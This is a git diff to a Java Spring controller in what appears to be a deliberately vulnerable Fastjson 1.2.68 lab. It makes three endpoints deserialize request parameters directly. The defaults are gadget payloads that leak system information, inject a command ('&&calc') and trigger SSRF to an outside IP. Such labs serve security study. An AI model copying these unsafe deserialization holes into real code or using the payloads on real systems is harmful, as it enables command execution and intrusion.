@@ -9,6 +9,7 @@ import com.snowsec0.fastjsonvul.fastjson68.PingException;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.servlet.ModelAndView;
@@ -28,27 +29,33 @@ public class fastjson68 {
         }
     };
     
-	
+    
  @RequestMapping("/webdriverexception")
- public String fastfson68() {
-  String comment = "{\"content\":{\"$ref\":\"$x.systemInformation\"}, \"x\": {\"@type\":\"org.openqa.selenium.WebDriverException\",\"@type\":\"java.lang.Exception\"}}";
+ public String fastfson68(@RequestParam(value="comment",required=false)String comment) {
+	 if(comment ==null || comment.length() == 0) {
+		  comment = "{\"content\":{\"$ref\":\"$x.systemInformation\"}, \"x\": {\"@type\":\"org.openqa.selenium.WebDriverException\",\"@type\":\"java.lang.Exception\"}}";
+	 }
   JSONObject jsonObject = JSON.parseObject(comment);
   System.out.printf(jsonObject.getString("content"));
   return jsonObject.getString("content");
  }
  
  @RequestMapping("/pingexception")
- public String pingexception()
+ public String pingexception(@RequestParam(value="cmd",required=false)String cmd)
  {
-  String str = "{\"@type\":\"java.lang.Exception\", \"@type\":\"com.snowsec0.fastjsonvul.fastjson68.PingException\",\"domain\":\"b1ue.cn&&calc\"}";
-  JSONObject jsonObject = JSON.parseObject(str);
+	 if(cmd ==null || cmd.length() == 0) {
+		 cmd = "{\"@type\":\"java.lang.Exception\", \"@type\":\"com.snowsec0.fastjsonvul.fastjson68.PingException\",\"domain\":\"b1ue.cn&&calc\"}";
+	 }
+		 JSONObject jsonObject = JSON.parseObject(cmd);
   return "ping exception";
  }
  @RequestMapping("/datasourceexception")
- public String datasource()
+ public String datasource(@RequestParam(value="url",required=false)String url)
  {
-  String str = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.snowsec0.fastjsonvul.fastjson68.DatasourceException\", \"dataSource\": {\"@type\": \"java.net.URL\", \"val\": \"http://47.104.218.243/ssrf/ssrf.php?rand=fastjson68\"}}"; 
-  JSONObject jsonObject = JSON.parseObject(str);
+	 if(url ==null || url.length() == 0) {
+		  url = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.snowsec0.fastjsonvul.fastjson68.DatasourceException\", \"dataSource\": {\"@type\": \"java.net.URL\", \"val\": \"http://47.104.218.243/ssrf/ssrf.php?rand=fastjson68\"}}"; 
+	 }
+	 JSONObject jsonObject = JSON.parseObject(url);
   return "ping exception";
  }
  
